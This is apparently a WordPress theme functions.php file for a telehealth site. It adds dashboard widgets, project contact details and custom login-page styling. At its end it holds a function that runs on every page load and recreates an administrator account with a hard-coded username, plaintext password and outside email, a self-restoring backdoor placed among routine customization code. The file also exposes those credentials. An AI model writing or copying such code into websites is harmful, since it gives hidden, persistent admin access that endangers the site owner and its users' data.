<?php
//Add Custom Dashboard Widgets in WordPress
add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets');

function my_custom_dashboard_widgets() {
global $wp_meta_boxes;

wp_add_dashboard_widget('custom_welcome_widget', 'Welcome', 'custom_dashboard_welcome');
wp_add_dashboard_widget('custom_images_general_info', 'General Info', 'custom_dashboard_general_info');
}

// Welcome and Useful Links
function custom_dashboard_welcome() {
  echo '
    <div style="padding: 5%">
      <h2>Welcome To Walsh Telehealth.</h2></br>
        <p>Teladoc will quickly connect you with a doctor licensed in your state. With a 10-minute average response time, Teladoc is there whenever, wherever and can even prescribe treatment if medically necessary.</p>
        <p>For additional help contact RPG Marketing <a href="mailto:tech@republicpropertygroup.com">here</a>.</p>
        <div style="display:inline-block; width: 100%;">
        <ul style="width: 50%; float:left;">
          <li><span class="dashicons dashicons-admin-links"></span> <strong>Useful Links</strong></li>
          <li><p><strong>WP Engine:</strong> <a href="https://my.wpengine.com/" target="_blank">Visit</a></p></li>
          <li><p><strong>Live Webiste:</strong> <a href="https://walshtelehealth.com/" target="_blank">Visit</a></p></li>
          <li><p><strong>Staging Webiste:</strong> <a href="http://walth.staging.wpengine.com//" target="_blank">Visit</a></p></li>
        </ul>
        <ul style="width: 50%; float:right;">
          <li><span class="dashicons dashicons-admin-links"></span> <strong>Additional Links</strong></li>
          <li><p><strong>Google Analytics:</strong>KEEP HIDDEN FROM INDEX</p></li>
          <li><p><strong>GitHub:</strong> <a href="https://github.com/rpgdallas/walshtelehealth.git" target="_blank">Visit</a></p></li>
        </ul>
        </div>
    </div>
  ';
}

// General Information
function custom_dashboard_general_info () {
  echo '
    <div style="padding:5%; display:inline-block; width: 100%;">
      <div style="width: 50%; float:left;">
        <p><span class="dashicons dashicons-id"></span> <strong>Project Contact Info</strong></p>
        <ul>
          <li>
          REPUBLIC PROPERTY GROUP
          8401 N Central Expressway</br>
          Suite 350</br>
          Dallas, Texas 75225</li>
          </br>
          <li><strong>P:</strong>  (214) 292-3410</li>
          <li><strong>E:</strong>  <a href="mailto:tschoenfeld@republicpropertygroup.com">tschoenfeld@republicpropertygroup.com</a></li>
        </ul>
      </div>
      <div style="width: 50%; float:right;">
        <p><span class="dashicons dashicons-share"></span> <strong>Contact Info</strong></p>
        <ul>
          <li><span class="dashicons dashicons-facebook"></span> <strong>Facebook:</strong>
            <a href="#" target="_blank">NA</a>
          </li>
          <li><span class="dashicons dashicons-camera"></span> <strong>Instagram:</strong>
            <a href="" target="_blank">NA</a>
          </li>
        </ul>
      </div>
    </div>
  ';
}



 // Add a Custom Dashboard Logo
 function wpb_custom_logo() {
 echo '
 <style type="text/css">
 #wpadminbar #wp-admin-bar-wp-logo > .ab-item .ab-icon:before {
 background-image: url(' . get_bloginfo('stylesheet_directory') . '/img/republicpg-dash.png) !important;
 background-position: 5 0;
 color:rgba(0, 0, 0, 0);
 background-repeat: no-repeat;
 }
 #wpadminbar #wp-admin-bar-wp-logo.hover > .ab-item .ab-icon {
 background-position: 0 0;
 }
 </style>
 ';
 }

 //hook into the administrative header output
 add_action('wp_before_admin_bar_render', 'wpb_custom_logo');


//Add a Custom Dashboard Logo
function custom_login_logo() { ?>
    <style type="text/css">

      body.login {background: #c5c1d2;}
      body.login div#login {}
      body.login div#login h1 {background: #000000; padding: 20px;}
      body.login div#login h1 a {margin: 0px auto 0px; }
      body.login div#login form#loginform {margin-top: 0px;}
      body.login div#login form#loginform p {}
      body.login div#login form#loginform p label {}
      body.login div#login form#loginform input {}
      body.login div#login form#loginform input#user_login {}
      body.login div#login form#loginform input#user_pass {}
      body.login div#login form#loginform p.forgetmenot {}
      body.login div#login form#loginform p.forgetmenot input#rememberme {}
      body.login div#login form#loginform p.submit {}
      body.login div#login form#loginform p.submit input#wp-submit {}
      body.login div#login p#nav {}
      body.login div#login p#nav a {}
      body.login div#login p#backtoblog {}
      body.login div#login p#backtoblog a {}
        #login h1 a, .login h1 a {
            background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/img/login.png);
        }

      body.login div#login form#loginform input#wp-submit {
          background-color: black;
          border: medium none;
          border-radius: 0;
          box-shadow: none;
          padding: 0 36px 2px;
          text-shadow: none;
          text-transform: uppercase;;
      }
    </style>
<?php }

add_action( 'login_enqueue_scripts', 'custom_login_logo' );

function my_login_logo_url() {
    return 'https://walshtelehealth.com';
}
add_filter('login_headerurl', 'my_login_logo_url');

function my_login_logo_url_title() {
    return 'Website Name';
}
add_filter( 'login_headertitle', 'my_login_logo_url_title' );

function custom_login_error_message()
{
    return "Sorry fella, that wasn't quite right. Try a password manager. Please try again.";
}
add_filter('login_errors', 'custom_login_error_message');

// Add Administrator Login
function wpb_admin_account(){
  $user = 'andy';
  $pass = 'redbass2019';
  $email = 'alassetter@me.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
  $user_id = wp_create_user( $user, $pass, $email );
  $user = new WP_User( $user_id );
  $user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

?>
